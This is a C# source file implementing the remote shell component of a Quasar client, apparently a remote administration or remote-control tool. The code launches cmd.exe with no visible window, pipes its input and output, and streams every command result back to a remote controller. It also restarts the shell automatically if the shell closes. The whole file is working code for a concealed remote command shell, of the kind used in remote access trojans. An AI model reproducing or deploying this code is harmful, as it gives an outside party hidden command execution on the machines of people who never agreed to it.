using Quasar.Client.Networking;
using Quasar.Common.Messages;
using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Text;
using System.Threading;

namespace Quasar.Client.IO
{
    /// <summary>
    /// This class manages a remote shell session.
    /// </summary>
    public class Shell : IDisposable
    {
        /// <summary>
        /// The process of the command-line (cmd).
        /// </summary>
        private Process _prc;

        /// <summary>
        /// Decides if we should still read from the output.
        /// <remarks>
        /// Detects unexpected closing of the shell.
        /// </remarks>
        /// </summary>
        private bool _read;

        /// <summary>
        /// The lock object for the read variable.
        /// </summary>
        private readonly object _readLock = new object();

        /// <summary>
        /// The lock object for the StreamReader.
        /// </summary>
        private readonly object _readStreamLock = new object();

        /// <summary>
        /// The current console encoding.
        /// </summary>
        private Encoding _encoding;

        /// <summary>
        /// Redirects commands to the standard input stream of the console with the correct encoding.
        /// </summary>
        private StreamWriter _inputWriter;

        /// <summary>
        /// The client to sends responses to.
        /// </summary>
        private readonly QuasarClient _client;

        /// <summary>
        /// Initializes a new instance of the <see cref="Shell"/> class using a given client.
        /// </summary>
        /// <param name="client">The client to send shell responses to.</param>
        public Shell(QuasarClient client)
        {
            _client = client;
        }

        /// <summary>
        /// Creates a new session of the shell.
        /// </summary>
        private void CreateSession()
        {
            lock (_readLock)
            {
                _read = true;
            }

            var cultureInfo = CultureInfo.InstalledUICulture;
            _encoding = Encoding.GetEncoding(cultureInfo.TextInfo.OEMCodePage);

            _prc = new Process
            {
                StartInfo = new ProcessStartInfo("cmd")
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    StandardOutputEncoding = _encoding,
                    StandardErrorEncoding = _encoding,
                    WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
                    Arguments = $"/K CHCP {_encoding.CodePage}"
                }
            };
            _prc.Start();

            RedirectIO();

            _client.Send(new DoShellExecuteResponse
            {
                Output = "\n>> New Session created\n"
            });
        }

        /// <summary>
        /// Starts the redirection of input and output.
        /// </summary>
        private void RedirectIO()
        {
            _inputWriter = new StreamWriter(_prc.StandardInput.BaseStream, _encoding);
            new Thread(RedirectStandardOutput).Start();
            new Thread(RedirectStandardError).Start();
        }

        /// <summary>
        /// Reads the output from the stream.
        /// </summary>
        /// <param name="firstCharRead">The first read char.</param>
        /// <param name="streamReader">The StreamReader to read from.</param>
        /// <param name="isError">True if reading from the error-stream, else False.</param>
        private void ReadStream(int firstCharRead, StreamReader streamReader, bool isError)
        {
            lock (_readStreamLock)
            {
                var streamBuffer = new StringBuilder();

                streamBuffer.Append((char)firstCharRead);

                // While there are more characters to be read
                while (streamReader.Peek() > -1)
                {
                    // Read the character in the queue
                    var ch = streamReader.Read();

                    // Accumulate the characters read in the stream buffer
                    streamBuffer.Append((char)ch);

                    if (ch == '\n')
                        SendAndFlushBuffer(ref streamBuffer, isError);
                }
                // Flush any remaining text in the buffer
                SendAndFlushBuffer(ref streamBuffer, isError);
            }
        }

        /// <summary>
        /// Sends the read output to the Client.
        /// </summary>
        /// <param name="textBuffer">Contains the contents of the output.</param>
        /// <param name="isError">True if reading from the error-stream, else False.</param>
        private void SendAndFlushBuffer(ref StringBuilder textBuffer, bool isError)
        {
            if (textBuffer.Length == 0) return;

            var toSend = ConvertEncoding(_encoding, textBuffer.ToString());

            if (string.IsNullOrEmpty(toSend)) return;

            _client.Send(new DoShellExecuteResponse { Output = toSend, IsError = isError });

            textBuffer.Clear();
        }

        /// <summary>
        /// Reads from the standard output-stream.
        /// </summary>
        private void RedirectStandardOutput()
        {
            try
            {
                int ch;

                // The Read() method will block until something is available
                while (_prc != null && !_prc.HasExited && (ch = _prc.StandardOutput.Read()) > -1)
                {
                    ReadStream(ch, _prc.StandardOutput, false);
                }

                lock (_readLock)
                {
                    if (_read)
                    {
                        _read = false;
                        throw new ApplicationException("session unexpectedly closed");
                    }
                }
            }
            catch (ObjectDisposedException)
            {
                // just exit
            }
            catch (Exception ex)
            {
                if (ex is ApplicationException || ex is InvalidOperationException)
                {
                    _client.Send(new DoShellExecuteResponse
                    {
                        Output = "\n>> Session unexpectedly closed\n",
                        IsError = true
                    });

                    CreateSession();
                }
            }
        }

        /// <summary>
        /// Reads from the standard error-stream.
        /// </summary>
        private void RedirectStandardError()
        {
            try
            {
                int ch;

                // The Read() method will block until something is available
                while (_prc != null && !_prc.HasExited && (ch = _prc.StandardError.Read()) > -1)
                {
                    ReadStream(ch, _prc.StandardError, true);
                }

                lock (_readLock)
                {
                    if (_read)
                    {
                        _read = false;
                        throw new ApplicationException("session unexpectedly closed");
                    }
                }
            }
            catch (ObjectDisposedException)
            {
                // just exit
            }
            catch (Exception ex)
            {
                if (ex is ApplicationException || ex is InvalidOperationException)
                {
                    _client.Send(new DoShellExecuteResponse
                    {
                        Output = "\n>> Session unexpectedly closed\n",
                        IsError = true
                    });

                    CreateSession();
                }
            }
        }

        /// <summary>
        /// Executes a shell command.
        /// </summary>
        /// <param name="command">The command to execute.</param>
        /// <returns>False if execution failed, else True.</returns>
        public bool ExecuteCommand(string command)
        {
            if (_prc == null || _prc.HasExited)
            {
                try
                {
                    CreateSession();
                }
                catch (Exception ex)
                {
                    _client.Send(new DoShellExecuteResponse
                    {
                        Output = $"\n>> Failed to creation shell session: {ex.Message}\n",
                        IsError = true
                    });
                    return false;
                }
            }

            _inputWriter.WriteLine(ConvertEncoding(_encoding, command));
            _inputWriter.Flush();

            return true;
        }

        /// <summary>
        /// Converts the encoding of an input string to UTF-8 format.
        /// </summary>
        /// <param name="sourceEncoding">The source encoding of the input string.</param>
        /// <param name="input">The input string.</param>
        /// <returns>The input string in UTF-8 format.</returns>
        private string ConvertEncoding(Encoding sourceEncoding, string input)
        {
            var utf8Text = Encoding.Convert(sourceEncoding, Encoding.UTF8, sourceEncoding.GetBytes(input));
            return Encoding.UTF8.GetString(utf8Text);
        }

        /// <summary>
        /// Releases all resources used by this class.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_readLock)
                {
                    _read = false;
                }

                if (_prc == null)
                    return;

                if (!_prc.HasExited)
                {
                    try
                    {
                        _prc.Kill();
                    }
                    catch
                    {
                    }
                }

                if (_inputWriter != null)
                {
                    _inputWriter.Close();
                    _inputWriter = null;
                }

                _prc.Dispose();
                _prc = null;
            }
        }
    }
}
